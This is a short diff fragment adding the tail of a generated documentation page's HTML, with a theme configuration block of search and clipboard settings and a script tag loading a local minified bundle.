+      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": ["content.code.copy", "content.action.edit", "content.action.view", "content.tooltips", "navigation.tracking", "navigation.top", "search.share", "search.suggest"], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+    
+  </body>
+</html>
